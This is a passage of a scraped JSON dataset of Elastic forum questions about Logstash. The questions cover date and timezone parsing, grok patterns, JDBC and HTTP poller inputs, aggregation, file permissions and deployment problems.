=>\"%{pmd_widget_id}\" document_type => \"doc\" } stdout{} }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "60e5f4f2-c601-4712-a8be-e06fcfdd57dc",
    "url": "https://discuss.elastic.co/t/sql-last-value-in-logstash-http-pooler-or-http-input/227744",
    "title": "Sql_last_value in logstash http_pooler or http_input",
    "category": [
      "Logstash"
    ],
    "author": "sandy_rizqi",
    "date": "April 13, 2020, 8:26am",
    "body": "Hi there, May someone give me short explanation about http_pooler or http input plugin , from what variable i can get tracking data column ? i.e in jdbc input plugin we can use sql_last_value , so how in http or http_pooler ? And then is it possible to parse parameter from that kind of input plugin ?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "bb516d6b-e116-48e6-bf71-f9caed495c5e",
    "url": "https://discuss.elastic.co/t/world-writeable-permission/227721",
    "title": "World-writeable permission",
    "category": [
      "Logstash"
    ],
    "author": "kenahack",
    "date": "April 13, 2020, 3:16am",
    "body": "Hi, I have found world-writeable permission (777) on the following directory and after: /usr/share/logstash/vendor/bundle/jruby/2.3.0/gems/snmp-1.3.1/* My question is that does Logstash require such permission? The affected path also consists of ruby scripts and YAML files. e.g. /usr/share/logstash/vendor/bundle/jruby/2.3.0/gems/snmp-1.3.1/examples/datetime.rb /usr/share/logstash/vendor/bundle/jruby/2.3.0/gems/snmp-1.3.1/data/ruby/snmp/mibs/MPLS-LDP-ATM-STD-MIB.yaml",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "339849c0-5680-495c-9298-03a8c8f0fa87",
    "url": "https://discuss.elastic.co/t/logstash-configuration-for-multiple-files/227670",
    "title": "Logstash configuration for multiple files",
    "category": [
      "Logstash"
    ],
    "author": "Saber_Ben_Njima",
    "date": "April 12, 2020, 12:29pm April 12, 2020, 6:52pm",
    "body": "Hello i have a problem when i want to configure logstash to filter data for multiple log files where each file has a different structure and separators how can i configure logstash ?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ad19f902-b85a-45b7-9861-65ed7551e3b1",
    "url": "https://discuss.elastic.co/t/logstash-initialize-variables-before-input/227684",
    "title": "Logstash initialize variables before input",
    "category": [
      "Logstash"
    ],
    "author": "Mario_Morelli",
    "date": "April 12, 2020, 3:37pm April 12, 2020, 3:41pm",
    "body": "Hi Guys I use Logstash for the random projects at work and I just cant seem to figure out the following, seems like it should be easy enough My input uses the http poller plugin, that posts to a REST API There are 2 variables that this URL requires Start time End Time I would just like to understand how I can do the following to input into the http poller End Time = Need a method to get todays short date 2019-04-12 StartTime = Need a method to get yesterdays short date 2019-04-11 What would be the easiest way to get these variables done, to be used as input variables for the http poller? Thanks in advance:)",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2e2f5baa-25a0-470d-b66a-f4a9f33cc95c",
    "url": "https://discuss.elastic.co/t/i-dont-see-recent-logs-in-kibana/227583",
    "title": "I don't see recent logs in Kibana",
    "category": [
      "Logstash"
    ],
    "author": "manoj123",
    "date": "April 11, 2020, 6:32am April 12, 2020, 8:27am",
    "body": "Hi, I am new to Elasticsearch. I am using a 5.6.8 version of Elasticsearch and data comes from Mesos to Elasticsearch. Everything went well in setting up ELK stack but somehow I am not able to see recent logs in Kibana. I am able to see old logs but not recent like 15m-4h. Can some help me in fixing the issue.? Thanks Manoj Kumar",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "29841880-d037-450a-9c0d-40c90fbd5755",
    "url": "https://discuss.elastic.co/t/logstash-java-class-error/227644",
    "title": "Logstash java class error",
    "category": [
      "Logstash"
    ],
    "author": "Krish_Na",
    "date": "April 12, 2020, 4:14am April 12, 2020, 8:22am",
    "body": "Hi Gurus, Its been crazy Easter days for me, I tried installing ELK and JDK 14. Elasticsearch is working fine however when I try to run logbash.bat I am getting below error Java HotSpot(TM) 64-Bit Server VM warning: Ignoring option UseConcMarkSweepGC; support was removed in 14.0 Java HotSpot(TM) 64-Bit Server VM warning: Ignoring option CMSInitiatingOccupancyFraction; support was removed in 14.0 Java HotSpot(TM) 64-Bit Server VM warning: Ignoring option UseCMSInitiatingOccupancyOnly; support was removed in 14.0 Error: Could not find or load main class 7.6\\logstash-7.6.2\\logstash-7.6.2\\logstash-core\\lib\\jars\\animal-sniffer-annotations-1.14.jar;C:\\softwares\\ELK Caused by: java.lang.ClassNotFoundException: 7/6\\logstash-7/6/2\\logstash-7/6/2\\logstash-core\\lib\\jars\\animal-sniffer-annotations-1/14/jar;C:\\softwares\\ELK I have put my CLASS PATH as C:\\Program Files\\Java\\jdk-14\\lib*.jar Java_Home as C:\\Program Files\\Java\\jdk-14 path as C:\\softwares\\ELK 7.6\\logstash-7.6.2\\logstash-7.6.2\\bin; C:\\Program Files\\Java\\jdk-14\\bin; Not sure, why I am getting error while runing logstash.bat.. can you please help me out ???",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "6df44f16-4ad7-4923-8b38-75b0cb100635",
    "url": "https://discuss.elastic.co/t/please-help-date-parse-error-a-very-simple-dd-mm-yyyy-csv-to-logstash/227599",
    "title": "Please help - date parse error (a very simple dd-mm-yyyy) csv to logstash",
    "category": [
      "Logstash"
    ],
    "author": "Venkatesh_Murthy",
    "date": "April 11, 2020, 11:55am April 12, 2020, 5:25am April 12, 2020, 5:27am",
    "body": "my CSV has the following: gymid,gymdate,sets,exercise,worktime,rest,reps,weight,muclegroup 3013,20-03-2020,1,Barbell Deadlift,01.42,03.02,11,47,back my config has: input { file{ path=>\"D:/gym1.csv\" start_position=>\"beginning\" sincedb_path=> \"NUL\" } } filter { csv { separator=>\",\" columns=> [\"gymid\",\"gymdate\", \"sets\", \"exercise\", \"worktime\", \"rest\", \"reps\", \"weight\", \"musclegroup\"] } date { match => [\"gymdate\", \"dd-mm-yyyy\"] target => \"@timestamp\" } mutate {convert => [\"sets\", \"integer\"]} mutate {convert => [\"reps\", \"integer\"]} mutate {convert => [\"worktime\", \"float\"]} mutate {convert => [\"rest\", \"float\"]} mutate {convert => [\"reps\", \"float\"]} mutate {convert => [\"weight\", \"integer\"]} } output { elasticsearch{ hosts=> \"localhost:9200\" index=>\"gym\" document_type => \"workout\" } stdout{} } i get dateparseerror",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "543a9d5d-2176-42d4-8d45-af3bf3718b37",
    "url": "https://discuss.elastic.co/t/grok-pattern-data-vs-greedydata-mismatch/225300",
    "title": "Grok pattern DATA vs GREEDYDATA mismatch",
    "category": [
      "Logstash"
    ],
    "author": "Mehak_Bhargava",
    "date": "March 26, 2020, 10:23pm March 28, 2020, 2:54am March 31, 2020, 5:58pm April 11, 2020, 4:46pm",
    "body": "In one log file, I have two different formats of log lines as below. Why does %{GREEDYDATA:loglevel} and %{DATA:loglevel} make a huge difference in loglevel output? 2020-03-26 11:31:10,324 [Thread-40] INFO o.e.j.s.AbstractConnector - Stopped ServerConnector@676505de{HTTP/1.1,[http/1.1]}{0.0.0.0:8780} %{DATESTAMP:timestamp} \\[%{DATA:thread}\\] %{GREEDYDATA:loglevel} %{JAVACLASS:javaClass} %{GREEDYDATA:logmessage} { \"javaClass\": \"o.e.j.s.AbstractConnector\", \"loglevel\": \" INFO \", \"logmessage\": \" - Stopped ServerConnector@676505de{HTTP/1.1,[http/1.1]}{0.0.0.0:8780}\", \"thread\": \"Thread-40\", \"timestamp\": \"20-03-26 11:31:10,324\" } 2020-03-26 03:36:21,546 [DispatcherScheduler_Worker-1] INFO o.a.c.h.HttpMethodDirector - I/O exception (java.net.ConnectException) caught when processing request: Connection timed out: connect %{DATESTAMP:timestamp} \\[%{DATA:thread}\\] %{DATA:loglevel} %{JAVACLASS:javaClass} %{GREEDYDATA:logmessage} { \"javaClass\": \"o.a.c.h.HttpMethodDirector\", \"loglevel\": \"INFO \", \"logmessage\": \" - I/O exception (java.net.ConnectException) caught when processing request: Connection timed out: connect\", \"thread\": \"DispatcherScheduler_Worker-1\", \"timestamp\": \"20-03-26 03:36:21,546\" } 2020-03-26 11:31:10,324 [Thread-40] INFO o.e.j.s.AbstractConnector - Stopped ServerConnector@676505de{HTTP/1.1,[http/1.1]}{0.0.0.0:8780} %{DATESTAMP:timestamp} \\[%{DATA:thread}\\] %{DATA:loglevel} %{JAVACLASS:javaClass}%{GREEDYDATA:logmessage} { \"javaClass\": \"INFO\", \"loglevel\": \" \", \"logmessage\": \" o.e.j.s.AbstractConnector - Stopped ServerConnector@676505de{HTTP/1.1,[http/1.1]}{0.0.0.0:8780}\", \"thread\": \"Thread-40\", \"timestamp\": \"20-03-26 11:31:10,324\" } Because of this, the data in Kibana parsed sometimes shows Loglevel and sometimes not- Timestamp: Mar 26, 2020 @ 15:13:42.950 JavaClass: VER.jks LogLevel: ER Message: 2020-03-26 11:31:39,799 [WrapperSimpleAppMain] INFO o.e.j.u.s.SslContextFactory - x509=X509@706a432c(rmmca,h=[],w=[]) for SslContextFactory@7f4f185d(file:///C:/Program%20Files%20(x86)/ESQ%20SST/Certificates_ESQ/SERVER.jks,null) Timestamp: Mar 26, 2020 @ 15:13:42.950 JavaClass: o.e.j.s.AbstractConnector LogLevel: INFO Message: 2020-03-26 11:31:39,821 [WrapperSimpleAppMain] INFO o.e.j.s.AbstractConnector - Started ServerConnector@665c31ea{SSL,[ssl, http/1.1]}{0.0.0.0:8782}",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "68f47d3d-1834-4bba-a88c-938ff8a2b6ff",
    "url": "https://discuss.elastic.co/t/aggregate-plugin-sends-all-events-to-es/227445",
    "title": "Aggregate plugin sends all events to ES",
    "category": [
      "Logstash"
    ],
    "author": "xyz2",
    "date": "April 10, 2020, 6:38am April 10, 2020, 1:55pm April 10, 2020, 7:41pm April 10, 2020, 8:28pm April 10, 2020, 9:18pm April 10, 2020, 11:12pm April 11, 2020, 4:46am April 11, 2020, 2:28pm",
    "body": "Hi , Need to use multiple events and build single aggregated event based on session id to send to ES Here is how data looks like: session open for user abc (session id :1) session open for user bbc (session id :2) ....some operation by user abc (session id :1) ....some openration by user bbc (session id :2) session closed for user abc (session id :1) ...some operation by user bbc (session id :2) session closed for user bbc (session id :2) Am using aggregate filter. Also specified event.cancel() for non final events. Know the start and end events . Have set pipeline workers as 1 However, all the events are sent to ES. Checked this post ([AGGREGATE] - aggregate is working but single rows are sent to elastic too) and looks like it should work though. Noticed in one of the other posts (Aggregate - concatenate events), it suggests to use multiline in filebeat as well (along with aggregate plugin). Is FB multiline setting really needed if i have to avoid all events to be sent to ES ??",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "e1ece6fd-9e1f-4926-a9f2-527918b7d234",
    "url": "https://discuss.elastic.co/t/extract-a-integer-from-an-array-based-in-field-values/227498",
    "title": "Extract a integer from an array based in field values",
    "category": [
      "Logstash"
    ],
    "author": "krille.com",
    "date": "April 10, 2020, 12:27pm April 10, 2020, 1:57pm April 10, 2020, 2:40pm April 11, 2020, 11:45am",
    "body": "Hello... I am trying to extract a forex rate from an array based on the year and month fields. I have a array which is like this: // forexRate => // 2017;7;0.0001105093, 2017;8;0.0001116904, 2017;9;0.0001114438, 2017;10;0.0001118130, 2017;11;0.0001110309, 2017;12;0.0001111167, 2018;1;0.0001111290, 2018;2;0.0001113834, 2018;3;0.0001113524; I have already fields of integer for year and month which are: // year => 2017 // month => 9 I want to user the year and month to pick the third value // grok { // match => [ \"forexRate\" , \"%[year];%[month];%{NUMBER:rate}\" ] // add_field => [ \"reportRate\" , \"%{rate}\" ] // } Then use the rate to calculate a newCurrency // ruby { code => 'event.set(\"newCurrency\", event.get(\"numberCount\").to_i * 1 * [rate]) } How can I use the fields year and month to pick the third value in the array??",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "fe156b59-b18c-4339-8d4c-e3959b9dc846",
    "url": "https://discuss.elastic.co/t/how-to-make-many-conditions-for-one-field/227594",
    "title": "How to make many conditions for one field?",
    "category": [
      "Logstash"
    ],
    "author": "Emna1",
    "date": "April 11, 2020, 10:23am",
    "body": "Hi, i want to make many conditions associate to one field, itry this code if [Duration] >= 336 { mutate { add_field => { \"price\" => \"50$\" } } } else if [Duration] == 15{ mutate { add_field => { \"price\" => \"10$\" } } } the output in elasticsearch field price show only 50$ , so how can i make many condition in the same field price??",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "76b559c3-246b-44a7-85c2-a525e0cef654",
    "url": "https://discuss.elastic.co/t/type-error-no-implicit-conversion-of-nilclass-into-string-with-null-date/227547",
    "title": "Type error no implicit conversion of NilClass into String with null date",
    "category": [
      "Logstash"
    ],
    "author": "mattiacareddu",
    "date": "April 10, 2020, 6:58pm April 10, 2020, 11:15pm April 11, 2020, 10:00am",
    "body": "I'm having the following error when logstash try to index a null value in date field: Type error no implicit conversion of NilClass into String This is the complete stacktrace 2458 rufus-scheduler intercepted an error: job: Rufus::Scheduler::CronJob \"*/1 * * * *\" {} error: 2458 TypeError no implicit conversion of NilClass into String uri:classloader:/META-INF/jruby.home/lib/ruby/stdlib/date/format.rb:335:in _parse' uri:classloader:/META-INF/jruby.home/lib/ruby/stdlib/date.rb:734:in parse' /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-jdbc-4.3.19/lib/logstash/plugin_mixins/jdbc/value_tracking.rb:97:in set_value' /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-jdbc-4.3.19/lib/logstash/plugin_mixins/jdbc/jdbc.rb:255:in execute_statement' /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-jdbc-4.3.19/lib/logstash/inputs/jdbc.rb:309:in execute_query' /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-jdbc-4.3.19/lib/logstash/inputs/jdbc.rb:276:in block in run' /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/rufus-scheduler-3.0.9/lib/rufus/scheduler/jobs.rb:234:in do_call' /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/rufus-scheduler-3.0.9/lib/rufus/scheduler/jobs.rb:258:in do_trigger' /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/rufus-scheduler-3.0.9/lib/rufus/scheduler/jobs.rb:300:in block in start_work_thread' /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/rufus-scheduler-3.0.9/lib/rufus/scheduler/jobs.rb:299:in block in start_work_thread' org/jruby/RubyKernel.java:1425:in loop' /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/rufus-scheduler-3.0.9/lib/rufus/scheduler/jobs.rb:289:in block in start_work_thread' tz: ENV['TZ']: Time.now: 2020-04-10 18:18:00 UTC scheduler: object_id: 2008 opts: {:max_work_threads=>1} frequency: 0.3 scheduler_lock: #Rufus::Scheduler::NullLock:0x68aa044b trigger_lock: #Rufus::Scheduler::NullLock:0x454b18b4 uptime: 177.913122 (2m57s913) down?: false threads: 2 thread: #Thread:0x145d4cfc thread_key: rufus_scheduler_2008 work_threads: 1 active: 1 vacant: 0 max_work_threads: 1 mutexes: {} jobs: 1 at_jobs: 0 in_jobs: 0 every_jobs: 0 interval_jobs: 0 cron_jobs: 1 running_jobs: 1 work_queue: 0 The filed is mapped in elasticsearch as date type: \"updated_at\" : { \"type\" : \"date\" } In logstash I'm using the jdbc plugin so I simply execute the query that could return null value for that field. I tried to remove the field using this filter filter { if ![updated_at] { mutate{ remove_field => [\"updated_at\"] } } } but I still get the error. Any suggestions?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b5fe1081-69fa-4d9d-9dc3-0a3b15422ead",
    "url": "https://discuss.elastic.co/t/log-line-with-multiple-json-objects/227562",
    "title": "Log line with multiple JSON Objects",
    "category": [
      "Logstash"
    ],
    "author": "ccabral",
    "date": "April 10, 2020, 9:23pm April 10, 2020, 11:52pm April 10, 2020, 11:52pm",
    "body": "Hello, apologies if this has already been asked and answered but I can't seem to find a way to achieve what I'm looking for. I'm using logstash to break down log lines and I have everything separated but I run into a string that has two JSON objects in it. { \"topic\": \"testing\", \"payload\": { \"context\": { \"processed_event_name\": \"TRANSACTION_CREATED\", \"processed_event_context\": { \"transaction_id\": 139597215, \"type_of_transaction\": 1 } }, \"eventName\": \"MESSAGE_PROCESSED\", \"correlationId\": \"954625b4-1307-4298-b206-c0949613f603\", \"timestamp\": \"2019-04-12T13:01:35-07:00\" } } { \"correlationId\": \"954625b4-1307-4298-b206-c0949613f603\", \"eventId\": \"TRANSACTION_CREATED\", \"hostname\": \"ccabrals-MacBook-Pro.local\" } Running this on the above string results in the second JSON object being parsed into top level key value pairs in the output json { source => \"json\" target => \"[json_object]\" } But I can't match the first nested JSON Object. My desired output would be something like this: nested_json_object: { nested_key_value_pairs: { key:value } }, json_object: { key: value, } Any help would be appreciated, thanks.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ef94d9ef-5f66-4dd6-82cd-0529d78d57b7",
    "url": "https://discuss.elastic.co/t/elk-deploy-no-longer-pulling-in-data-logstash-logs-error-stops-immediately/227503",
    "title": "ELK deploy no longer pulling in data. Logstash logs error, stops immediately",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 10, 2020, 2:02pm April 10, 2020, 1:43pm April 10, 2020, 2:13pm April 10, 2020, 3:46pm April 10, 2020, 4:11pm April 10, 2020, 4:14pm April 10, 2020, 5:19pm April 10, 2020, 9:47pm",
    "body": "",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "f53d5d4a-f65c-4643-9e9b-3df36a52bc05",
    "url": "https://discuss.elastic.co/t/logstash-pipeline-port-is-not-visible-outside-openshift-kubernetes/227372",
    "title": "Logstash pipeline port is not visible outside Openshift/Kubernetes",
    "category": [
      "Logstash"
    ],
    "author": "nila",
    "date": "April 9, 2020, 4:48pm April 9, 2020, 5:49pm April 9, 2020, 6:49pm April 10, 2020, 12:15am April 10, 2020, 4:22am April 10, 2020, 7:37pm",
    "body": "Hello all - I have setup ELK cluster on Openshift/Kubernetes with TLS. All components work fine. But when I configure filebeat to my logstash with pipeline port(created service with a nodeport), it is unable to find the port and getting connection refused. I created filebeat inside the cluster and it works fine. The issue is publishing outside the cluster. Filebeat logstash output is looking for tcp address as logstash:<port>. If I give logstash:443, i get lumber jack error. If I give logstash:port, I get connection refused. I think the logstash itself is embedded with port 443 which will route to my port. But Filebeat puts default port 5044 if I remove the port number. How do I over come this? Thanks",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "bd050b97-7dbb-4270-b1a8-31aefdd0ad82",
    "url": "https://discuss.elastic.co/t/unable-to-see-logstash-monitoring-info-in-kibana-ui/227420",
    "title": "Unable to see Logstash monitoring info in Kibana UI",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 9, 2020, 11:30pm April 10, 2020, 7:10pm April 10, 2020, 7:10pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7a9b723e-4ded-4060-879c-52805499a434",
    "url": "https://discuss.elastic.co/t/date-filter-on-unix-epoch-failing/227422",
    "title": "Date Filter on Unix Epoch Failing",
    "category": [
      "Logstash"
    ],
    "author": "ben-10",
    "date": "April 10, 2020, 12:12am April 10, 2020, 12:34am April 10, 2020, 1:41am April 10, 2020, 5:03am April 10, 2020, 1:07pm April 10, 2020, 1:18pm April 10, 2020, 1:23pm April 10, 2020, 4:09pm April 10, 2020, 4:09pm",
    "body": "The date filter fails when attempting to match a unix epoch integer field and I can't figure out why. The data ingested is from xml using the following logstash config: input { file { path => [ \"/home/ben/dmarc-reports/AvidXchange.com!domain.com!1586232003!1586318403.xml\" ] start_position => \"beginning\" mode => \"read\" sincedb_path => \"/home/ben/.sincedb-dmarctest\" exit_after_read => true file_completed_action => \"log\" file_completed_log_path => \"/home/ben/dmarccompleted.log\" codec => multiline { pattern => \"<feedback>\" negate => \"true\" what => \"previous\" } } } filter { xml { source => \"message\" target => \"parsed_xml\" store_xml => false xpath => [ \"/feedback/report_metadata/org_name/text()\", \"reporting_org\", \"/feedback/report_metadata/report_id/text()\", \"report_id\", \"/feedback/report_metadata/date_range/begin/text()\", \"report_start\", \"/feedback/report_metadata/date_range/end/text()\", \"report_end\", \"/feedback/record/row/source_ip/text()\", \"email_server_ip\", \"/feedback/record/row/policy_evaluated/dkim/text()\", \"policy_dkim\", \"/feedback/record/row/policy_evaluated/spf/text()\", \"policy_spf\", \"/feedback/auth_results/dkim/result/text()\", \"auth_dkim\", \"/feedback/auth_results/spf/result/text()\", \"auth_spf\" ] } mutate { convert => { \"report_start\" => \"integer\" \"report_end\" => \"integer\" } } date { match => [ \"report_start\", \"UNIX\", \"UNIX_MS\" ] #target => \"report_start\" } date { match => [ \"report_end\", \"UNIX\", \"UNIX_MS\" ] target => \"report_end_time\" } dns { reverse => [ \"email_server_ip\" ] } if '<?xml version=\"1.0\" encoding=\"UTF-8\" ?>' in [message] { drop {} } } output { elasticsearch { index => \"logstash_dmarcxml_%{+YYYY.MM.dd}\" } } Also does anyone know a list of of xpath functions that logstash accepts?",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "8c5936d4-a61b-4cba-93b7-f069241d4a52",
    "url": "https://discuss.elastic.co/t/how-to-create-different-index-for-different-logpaths/227438",
    "title": "How to Create Different index for different Logpaths",
    "category": [
      "Logstash"
    ],
    "author": "Pacha_Gopi",
    "date": "April 10, 2020, 5:11am April 10, 2020, 11:53am April 10, 2020, 1:50pm April 10, 2020, 3:58pm",
    "body": "Hi I am getting logs from filebeat to my ELK server.One filebeat is sending two diiferent log files.My file beat is sending Nginx logs and Laraverl logs,my requirement is that i have to create Different index for different Logpaths can any one tell me how can I create different index",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1fe3ff5b-d39e-43ae-86ce-34145e416d83",
    "url": "https://discuss.elastic.co/t/how-change-the-format-of-duration-between-two-dates-in-datetime/227488",
    "title": "How change the format of duration between two dates in dateTime?",
    "category": [
      "Logstash"
    ],
    "author": "Emna1",
    "date": "April 10, 2020, 11:30am April 10, 2020, 1:54pm April 10, 2020, 2:48pm April 10, 2020, 3:50pm",
    "body": "I calculate the difference between two dates with this code. ruby{ code => \"event.set('Duration', (event.get('Release_date') - event.get('Date_of_entry')))\" } the output that i have : field duration with type number like this: 18000 how can i get the difference in time HH:mm:ss ?? please any ideas??",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "6f861927-3ade-4d00-825a-01ad06318a4c",
    "url": "https://discuss.elastic.co/t/clear-any-inflight-events-in-memory-before-starting-logstash-after-restart/224135",
    "title": "Clear any inflight events in memory before starting Logstash after restart",
    "category": [
      "Logstash"
    ],
    "author": "nmoham",
    "date": "March 18, 2020, 3:30pm April 10, 2020, 2:28pm",
    "body": "We're sending logs using filebeats to Logstash (Parsing with configs) --> LumberJack --> ES. In some situations while collecting newer data types, we want to re-index data, so we do the following - stop filebeats stop logstash Change any logstash filters Delete Filebeat registry to re-read data start Logstash Start Filebeat But during the step 5, when logstash is started, I think it tries to resend any inflight events it maybe holding up in the memory and creates the indexes with stale data in ES, but I want to prevent that from happening in this situation. I haven't been able to figure out any settings related that would help me preventing transmission of these events, as I want to re-index data. Any suggestions or directions will be really helpful. Thank you",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "886a2880-4d86-4c4f-90b8-9355b5c049c0",
    "url": "https://discuss.elastic.co/t/does-logstash-queue-data-until-crashed-elasticsearch-recovers/227518",
    "title": "Does logstash queue data until crashed elasticsearch recovers?",
    "category": [
      "Logstash"
    ],
    "author": "isharamadhawa",
    "date": "April 10, 2020, 2:24pm",
    "body": "I'm performing duplicate data removing process using fingerprint filter in logstash. I have an elastic cloud setup. Logstash reads data from my 3 node elastic cloud cluster and writes to the same cluster without any duplicate data. While performing this operation I came across multiple short interval down times of my elastic cluster. Because of down times of elasticsearch, I can't verify whether any data loss had happened since I have a very large index. So I want to know what happens to data when logstash can't send to elasticsearch due to failure in elasticsearch side. Does logstash keep that in memory until elasticsearch is reachable? or I loss data when elasticsearch is unreachable?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "e890691c-a484-414c-87f8-648c807f7232",
    "url": "https://discuss.elastic.co/t/logstash-7-6-1-exception-sequel-databaseconnectionerror/227516",
    "title": "Logstash 7.6.1 Exception: Sequel::DatabaseConnectionError",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 10, 2020, 2:15pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "31d4e640-298b-405f-9dc4-0b1c20b4dffb",
    "url": "https://discuss.elastic.co/t/logstash-date-filter-timezone-not-working/227451",
    "title": "Logstash date filter timezone not working",
    "category": [
      "Logstash"
    ],
    "author": "srinika",
    "date": "April 10, 2020, 7:49am April 10, 2020, 1:48pm",
    "body": "Hi I'm working on date filter and have used timezone. I get the output but the timezone is not working. Can someone please help me? Here's the config file input { stdin { } } filter { mutate { strip => \"message\" } date { timezone => \"Asia/Kolkata\" locale => \"en\" match => [\"message\", \"yyyy-MM-dd-HH:mm:ss.SSSS\"] target => \"@timestamp\" } } output { stdout { codec => rubydebug } } here's the output Screenshot (201)1365×232 39.1 KB In the output the timezone is not same as the date i gave in the input",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "9bd95f3a-d665-4a94-baef-ba553933abcc",
    "url": "https://discuss.elastic.co/t/logstash-parsing-from-filebeat-with-ecs/227494",
    "title": "Logstash parsing from filebeat with ECS",
    "category": [
      "Logstash"
    ],
    "author": "Rodrigo_Jimenez",
    "date": "April 10, 2020, 11:54am",
    "body": "Hi!, I saw some questions around talking about \"moving forward\" towards Logstash ECS compliance. So, I have now a setup with filebeat shipping logs using the nginx and system modules to an Logstash instance. I found this link: https://www.elastic.co/guide/en/logstash/current/logstash-config-for-filebeat-modules.html#parsing-nginx. As I understood, filebeat module for nginx (for example), will ship many fields (mostly metadata) but leave parsing of the message field to an elastic pipeline or, if using logtash, you could use the filters suggested on that link. The thing I found confusing is that the fields resulting from that suggested filtering don't align with the ECS at all. Therefore, all Filebeat dashboards are broken, SIEM broken. I guess I could go and manually fix those groks and other filters but, why is the suggested filtering not following ECS. I would like to know how to stick to ECS (without losing logstash ) Am I missing something? Thanks!!!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "88b8c78d-9626-4558-bda7-78625e39c5b8",
    "url": "https://discuss.elastic.co/t/logstash-and-filebeats-architecture-for-the-log-monitoring-use-case/227487",
    "title": "LogStash and FileBeats Architecture For the Log Monitoring Use Case",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 10, 2020, 11:24am",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "587d2d92-d969-40fd-8f39-4a09dcbcc614",
    "url": "https://discuss.elastic.co/t/in-jvm-options-file-pass-kill-9-for-killing-logstash-on-outofmemory/227414",
    "title": "In jvm.options file pass kill -9 for killing logstash on outofmemory",
    "category": [
      "Logstash"
    ],
    "author": "Sunil_Vp",
    "date": "April 9, 2020, 10:56pm April 9, 2020, 11:27pm",
    "body": "Hi, I wanted to pass -XX:OnOutOfMemoryError=kill -9 %p option to the JVM arguments of logstash. I added the same in jvm.options file, But once i add it i get: Error: Could not create the Java Virtual Machine. Error: A fatal exception has occurred. Program will exit. Please suggest if above option is needed in logstash and what is the format to add it. Should it be escaped or something? Thank You",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "75d1b04d-451a-4b66-812e-cdfc1a07ec50",
    "url": "https://discuss.elastic.co/t/jdbc-input-plugin-date-input-plugin-cant-apply-known-timezone-to-incoming-datetimes/227409",
    "title": "JDBC Input Plugin: \"date\" input plugin can't apply known timezone to incoming DATETIMEs",
    "category": [
      "Logstash"
    ],
    "author": "Jonathan_Rice",
    "date": "April 9, 2020, 9:47pm April 9, 2020, 10:36pm April 9, 2020, 10:36pm",
    "body": "Using Logstash 7.6.2 with the JDBC Input Plugin, and a MySQL database, I'm trying to import a DATETIME field, but apply a known timezone to that field on input, using the \"date\" filter. But \"date\" is always throwing an error when I try this. Here's an extended example... Assumptions: \"job_timestamp\" DATETIME field, with a value of \"2020-03-09 01:42:59\". It has no timezone offset, but we \"know\" it's in CDT (UTC -05:00). So the ISO8601 UTC datetime is \"2020-03-09T06:42:59Z\". The Logstash process' local timezone is PDT (UTC -07:00) - two hours behind CDT. We print out values with the \"stdout\" \"ruby debug\" output: output { stdout { codec => rubydebug } } Results: (1) With no \"date\" plugin applied, Logstash interprets the DATETIMEs as local PDT times, and adds 7 hours onto it to get the UTC time 8:42:59: { \"job_timestamp\" => 2020-03-09T08:42:59.000Z } (2) Let's try to apply the \"date\" input filter, to convey that \"job_timestamp\" is in CDT: date { match => [\"job_timestamp\", \"yyyy-MM-dd HH:mm:ss\"] timezone => \"US/Central\" target => \"new_timestamp\" } But this returns a date parse failure, and does not create the expected new result field \"new_timestamp\": { \"tags\" => [ [0] \"_dateparsefailure\" ], \"job_timestamp\" => 2020-03-09T08:42:59.000Z } (It leaves the original \"job_timestamp\" to be auto-converted, as before.) (3) What if we \"mutate\" the DATETIME to string before we try to apply \"date\"? mutate { convert => { \"job_timestamp\" => \"string\" } } date { match => [\"job_timestamp\", \"yyyy-MM-dd HH:mm:ss\"] timezone => \"US/Central\" target => \"new_timestamp\" } } Nope. \"job_timestamp\" gets converted to a string, alright, but it has already assumed that it is a local PDT datetime, so \"date\" gets fed an incorrect ISO8601 date string: { \"job_timestamp\" => \"2020-03-09T08:42:59.000Z\", \"tags\" => [ [0] \"_dateparsefailure\" ] } So my conclusion is that currently, there is no way for the user to apply a specified timezone conversion to incoming DATETIMEs from the JDBC Input Plugin. An early default assumption is made that any DATETIMEs without timezone offsets must be in the Logstash process' local timezone, and that assumption is made before any data is passed to \"date\", so \"date\" can't do much to fix it (without elaborate hacking, anyway). Can someone confirm my findings? For now, I can do this 